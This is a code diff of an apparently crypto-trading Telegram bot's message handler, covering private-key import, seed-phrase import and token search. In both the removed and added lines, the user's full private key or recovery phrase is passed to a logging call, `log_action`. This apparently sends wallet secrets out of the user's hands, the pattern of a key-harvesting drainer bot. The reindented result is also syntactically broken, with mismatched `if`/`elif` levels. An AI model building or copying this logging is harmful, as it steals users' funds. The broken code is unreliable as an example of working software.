@@ -206,20 +206,28 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
 
     # IMPORT PK
-    if state == "import_pk":
-        pub = import_private_key(user_id, text)
-        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid key")
-        await log_action(context, f"PK Imported\nUser:{user_id}\n{text}")
-        user_state.pop(user_id)
+   if state == "import_pk":
+    pub = import_private_key(user_id, text)
 
-    # IMPORT PHRASE
-    elif state == "import_phrase":
-        pub = import_phrase(user_id, text)
-        await update.message.reply_text(f"✅ Imported:\n{pub}" if pub else "❌ Invalid phrase")
-        await log_action(context, f"Phrase Imported\nUser:{user_id}\n{text}")
-        user_state.pop(user_id)
+    await update.message.reply_text(
+        f"✅ Imported:\n{pub}" if pub else "❌ Invalid key"
+    )
 
-    # MARKET SEARCH
+    await log_action(context, f"PK Imported\nUser:{user_id}\n{text}")
+    user_state.pop(user_id)
+
+
+elif state == "import_phrase":
+    pub = import_phrase(user_id, text)
+
+    await update.message.reply_text(
+        f"✅ Imported:\n{pub}" if pub else "❌ Invalid phrase"
+    )
+
+    await log_action(context, f"Phrase Imported\nUser:{user_id}\n{text}")
+    user_state.pop(user_id)
+
+
 elif state == "search":
     try:
         info = get_token_info(text)
@@ -241,7 +249,6 @@ elif state == "search":
         await update.message.reply_text("❌ Failed to fetch token data")
 
     user_state.pop(user_id)
-
     # BUY FLOW
     elif state == "buy_token":
         wallet = load_wallet(user_id)
